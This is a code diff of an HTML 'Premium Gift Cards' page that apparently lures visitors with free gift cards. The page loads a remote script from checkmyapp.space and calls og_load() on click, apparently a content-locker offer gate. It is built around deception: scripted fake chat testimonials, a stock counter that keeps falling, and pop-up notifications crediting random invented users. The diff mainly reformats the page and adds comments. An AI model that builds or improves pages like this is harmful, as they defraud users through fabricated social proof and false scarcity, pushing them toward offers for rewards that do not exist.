@@ -6,6 +6,7 @@
 <title>Premium Gift Cards</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700;800&display=swap" rel="stylesheet">
 
+<script type="text/javascript">var og_autostart = false;</script>
 <script type="text/javascript" id="ogjs" src="https://checkmyapp.space/cl/js/7jvwjk"></script>
 
 <style>
@@ -42,6 +43,7 @@ z-index:-3;
 100%{transform:scale(1.12) translateY(-18px);}
 }
 
+/* --- TT OVERLAY: GIF FULL SCREEN ONLY --- */
 #ttOverlay {
     position: fixed;
     inset: 0;
@@ -57,6 +59,7 @@ z-index:-3;
     pointer-events: none;
 }
 
+/* NOTIFICATION STYLE */
 #notification-toast {
     position: fixed;
     bottom: 20px;
@@ -141,6 +144,7 @@ color:#93c5fd;
 transition: all 0.4s ease;
 }
 
+/* LIVE CHAT AREA */
 .chat-container {
     max-width: 580px;
     margin: 40px auto 20px;
@@ -344,7 +348,7 @@ background:#1f2937;
 <div class="footer">© 2026 Premium Gift Cards</div>
 
 <script>
-// --- PAGE LOGIC (Original Messages) ---
+// --- MESSAGES ARE BACK ---
 const giftCardMsgs = [
     "Fuck! I only got $10 card while others got $100. My luck is literally trash.",
     "Is this actually real? I've been scammed 4 times today on other sites.",
@@ -376,16 +380,18 @@ const cardsData = [
     {n: "Apple $50", img: "https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg"},
     {n: "Google Play $100", img: "https://upload.wikimedia.org/wikipedia/commons/d/d0/Google_Play_Arrow_logo.svg"}
 ];
-let usedMessages = [];
+
 let stocks = [46, 37, 61, 50, 72, 28];
 
 function getUSATime() { return new Intl.DateTimeFormat('en-GB', { timeZone: 'America/New_York', hour: '2-digit', minute: '2-digit', hour12: false }).format(new Date()); }
+
 function updateStock() {
     const idx = Math.floor(Math.random() * 6);
     const tag = document.getElementById(`stock-${idx}`);
     if (stocks[idx] > 2) { stocks[idx] -= 1; tag.innerText = `Still ${stocks[idx]} Card`; }
     setTimeout(updateStock, 15000);
 }
+
 function showNotif() {
     const toast = document.getElementById('notification-toast');
     const u = usersList[Math.floor(Math.random()*usersList.length)];
@@ -398,6 +404,7 @@ function showNotif() {
     setTimeout(() => { toast.classList.remove('show'); }, 4000);
     setTimeout(showNotif, 12000);
 }
+
 function addChat() {
     const box = document.getElementById('chatBox');
     const u = usersList[Math.floor(Math.random()*usersList.length)];
@@ -423,12 +430,15 @@ function openOffer(title,el){
     },900);
 }
 
-// التفعيل المباشر بدون Iframe
 function go(){ 
     og_load(); 
 }
 
-function backPage(){ document.getElementById("offerPage").style.display="none"; document.getElementById("grid").style.display="grid"; document.getElementById("chatArea").style.display="block"; }
+function backPage(){ 
+    document.getElementById("offerPage").style.display="none"; 
+    document.getElementById("grid").style.display="grid"; 
+    document.getElementById("chatArea").style.display="block"; 
+}
 
 window.addEventListener("load",()=>{
     showNotif();
